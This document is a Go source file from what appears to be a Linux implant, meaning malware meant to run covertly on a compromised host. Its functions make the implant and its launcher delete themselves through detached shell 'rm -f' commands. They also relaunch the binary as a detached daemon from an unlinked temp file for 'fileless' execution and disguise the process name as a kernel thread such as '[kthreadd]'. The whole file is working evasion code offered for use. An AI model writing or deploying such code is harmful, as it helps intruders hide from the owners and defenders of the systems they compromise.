// implant/exec_attrs_linux.go
//go:build linux

package main

import (
	"crypto/rand"  // For random temp name
	"encoding/hex" // For random temp name
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"syscall"
)

// These consts must match the ones in main.go
// const (
// 	backgroundMarkerEnvVarLinux = "IMPLANT_IS_BACKGROUND_XYZ123"
// 	originalPathEnvVarLinux     = "IMPLANT_ORIG_LAUNCHER_PATH_XYZ789"
// )

func init() {
	doSelfDelete = linuxScheduleSelfDeleteGrandchild
	relaunchAsDaemonInternal = linuxRelaunchAsDaemon
	// takeScreenshot assignment (if any for Linux)
}

func linuxScheduleSelfDeleteGrandchild(selfExePath string, originalLauncherPath string) {
	// Delete the original launcher first if it's different from selfExePath
	if originalLauncherPath != "" && originalLauncherPath != selfExePath {
		quotedOriginalPath := fmt.Sprintf("%q", originalLauncherPath)
		deleterCmdScript := fmt.Sprintf("sleep 1 && rm -f %s", quotedOriginalPath)

		cmd := exec.Command("sh", "-c", deleterCmdScript)
		cmd.SysProcAttr = &syscall.SysProcAttr{
			Setsid: true, // Detach from the current session, run independently.
		}
		err := cmd.Start()
		if err == nil {
			// Instead of Releasing, Wait for the process in a new goroutine
			// to prevent it from becoming a zombie if the parent (implant) is still running.
			go func() {
				_ = cmd.Wait() // Reap the child process
			}()
		}
		// If err != nil, log it or handle as appropriate for your implant's operational needs.
		// For now, we follow the original logic of not blocking/crashing the implant on this error.
	}

	// Delete the current executable (selfExePath)
	// Use Go's %q to ensure the path is correctly quoted for the shell.
	quotedSelfPath := fmt.Sprintf("%q", selfExePath)
	deleterCmdScriptSelf := fmt.Sprintf("sleep 3 && rm -f %s", quotedSelfPath)

	cmdSelf := exec.Command("sh", "-c", deleterCmdScriptSelf)
	cmdSelf.SysProcAttr = &syscall.SysProcAttr{
		Setsid: true, // Detach from the current session, run independently.
	}

	// Start the command.
	err := cmdSelf.Start() // Note: This `err` shadows the one from the previous block, which is fine.
	if err == nil {
		// Instead of Releasing, Wait for the process in a new goroutine
		// to prevent it from becoming a zombie if the parent (implant) is still running.
		go func() {
			_ = cmdSelf.Wait() // Reap the child process
		}()
	}
	// If err != nil, log or handle as appropriate.
}

// linuxRelaunchAsDaemon re-executes the implant by:
// 1. Copying originalLauncherExecutablePath to a temporary file.
// 2. Executing the temporary file with targetArgv0Name as argv[0].
// 3. Passing originalTrueLauncherPathForEnv via an environment variable.
// 4. Deleting the temporary file after launch (for "fileless" execution of the copy).
//
// originalLauncherExecutablePath: Path of the binary to copy and run (e.g., initial launcher).
// argsForNewProcess: Generally unused now for command line, but kept for signature consistency.
// targetArgv0Name: The desired argv[0] for the new process (e.g., "[kthreadd]").
// bgEnvMarkerKey: Environment variable to mark the background process.
// origPathEnvKey: Environment variable key for the original launcher path.
// origPathEnvValue: Path of the *very first* executable run by user, for self-destruct.
func linuxRelaunchAsDaemon(originalLauncherExecutablePath string, argsForNewProcess []string, targetArgv0Name string, bgEnvMarkerKey string, origPathEnvKey string, origPathEnvValue string) error {
	// Create a temporary file name for the copy
	randBytes := make([]byte, 8)
	_, err := rand.Read(randBytes)
	if err != nil {
		return fmt.Errorf("failed to generate random bytes for temp file: %v", err)
	}
	tempFileName := filepath.Join(os.TempDir(), "implant_"+hex.EncodeToString(randBytes))

	// Read the content of the original executable
	inputBytes, err := os.ReadFile(originalLauncherExecutablePath)
	if err != nil {
		return fmt.Errorf("failed to read original executable '%s': %v", originalLauncherExecutablePath, err)
	}

	// Write the content to the temporary file and make it executable
	err = os.WriteFile(tempFileName, inputBytes, 0700) // rwx------
	if err != nil {
		return fmt.Errorf("failed to write temporary executable '%s': %v", tempFileName, err)
	}
	// Ensure temp file is cleaned up if something goes wrong before/during Start or after successful start.
	// Defer removal after successful start, or remove explicitly on error.
	// For now, we stick to the original logic of removing *after* successful start.

	// Prepare the command to execute the temporary file
	// The first element of cmd.Args is conventionally the program name as it should appear in ps, etc.
	// This is what targetArgv0Name is for.
	cmd := exec.Command(tempFileName)
	cmd.Args = append([]string{targetArgv0Name}, argsForNewProcess...)

	// Set environment variables for the new process
	// Include existing environment variables, plus our special markers.
	cmd.Env = os.Environ()
	cmd.Env = append(cmd.Env, fmt.Sprintf("%s=1", bgEnvMarkerKey))
	cmd.Env = append(cmd.Env, fmt.Sprintf("%s=%s", origPathEnvKey, origPathEnvValue))

	// Detach the process from the current terminal
	// Setsid creates a new session and detaches from the controlling terminal.
	// This is crucial for daemon-like behavior.
	cmd.SysProcAttr = &syscall.SysProcAttr{
		Setsid: true,
	}

	// Start the new process
	err = cmd.Start()
	if err != nil {
		// If starting fails, try to clean up the temporary file
		_ = os.Remove(tempFileName)
		return fmt.Errorf("failed to start detached process from '%s' as '%s': %v", tempFileName, targetArgv0Name, err)
	}

	// After successfully starting the new process, delete the temporary executable file.
	// This achieves a "fileless" execution for the copied implant, as the file backing
	// the running process is immediately unlinked from the filesystem.
	// The parent (this process) will exit shortly after this, so it doesn't need to Wait() for the child.
	// The child will be reparented to init.
	errRemove := os.Remove(tempFileName)
	if errRemove != nil {
		// This is not ideal, as the temp file remains. Log this or handle as a non-fatal issue.
		// The new process is already running independently.
		// For robustness, one might consider logging this to a well-known implant operational log if one exists.
		// For now, we proceed as the core functionality (daemon running) is achieved.
		// fmt.Fprintf(os.Stderr, "Warning: failed to remove temporary file '%s': %v\n", tempFileName, errRemove)
	}

	// The new process is now running in the background, detached.
	// The parent process (this one) can now exit.
	return nil
}
